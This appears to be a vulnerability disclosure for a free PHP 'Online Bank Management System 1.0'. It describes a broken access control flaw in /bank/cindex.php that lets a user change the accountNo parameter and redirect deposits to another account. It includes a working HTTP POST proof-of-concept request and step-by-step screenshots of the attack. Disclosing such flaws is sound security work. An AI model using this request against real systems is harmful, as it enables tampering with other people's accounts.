##Online Bank Management System has an ultra vires loophole


## Affected version: 
Online Bank Management System - 1.0

## Software:
https://www.sourcecodester.com/php/15373/online-banking-management-system-php-free-source-code.html

## Vulnerability File:
/bank/cindex.php

## Description:
Online Bank Management System - 1.0 is vulnerable to unauthorized and arbitrary changes in the accountNo parameter in /bank/cindex.php. A malicious attacker can exploit this vulnerability to perform horizontal privilege violations.

Status: CRITICAL

POC
```
POST /bank/cindex.php HTTP/1.1
Host: localhost:8088
Content-Length: 60
Cache-Control: max-age=0
sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8088/bank/cindex.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4sg5c1hjqeq80s5kt2du5cmuih
Connection: close

accountNo=1005469&userId=1&checkno=888&amount=10000&deposit=

```
1、Take 1005469 account as an example, to deposit money, the account has an amount of 10,000
![3fd5290879f71ae5dc2690c0b76efa3](https://github.com/user-attachments/assets/0cdaae84-5686-434b-8578-9b8e1dfec38c)

2、Take 10054777 account as an example, the account has 26,000 amounts
![83bef9f8d6401d9f55255990efc9b65](https://github.com/user-attachments/assets/10443cd1-1991-45ad-bad9-874a475fc561)

3、Capture packets for deposit operations
![1d158fe931cc6e5b8a779e4fff6f277](https://github.com/user-attachments/assets/89e32a9e-fb1c-4dbb-9e63-5e87664626ac)

4、Modify the account
![f4ad2bae5ad9a2306659cf8eed38d47](https://github.com/user-attachments/assets/e0f5c8c7-34e9-4680-8bf7-e322295ea3c0)

5、The operation was successful
![b81f342f1b6ea88c236fba88fe3cf95](https://github.com/user-attachments/assets/1009a4d0-1cb4-44e4-bfbc-77a3bd09a3b8)

6、It can be seen that the $10,000 that should have been in the 1005469 account was deposited under the 10054777 account
![1ab1683fa0a97c17bdeb4f373ac6186](https://github.com/user-attachments/assets/359a00b5-a396-46a6-9bd6-9156d06a44cc)
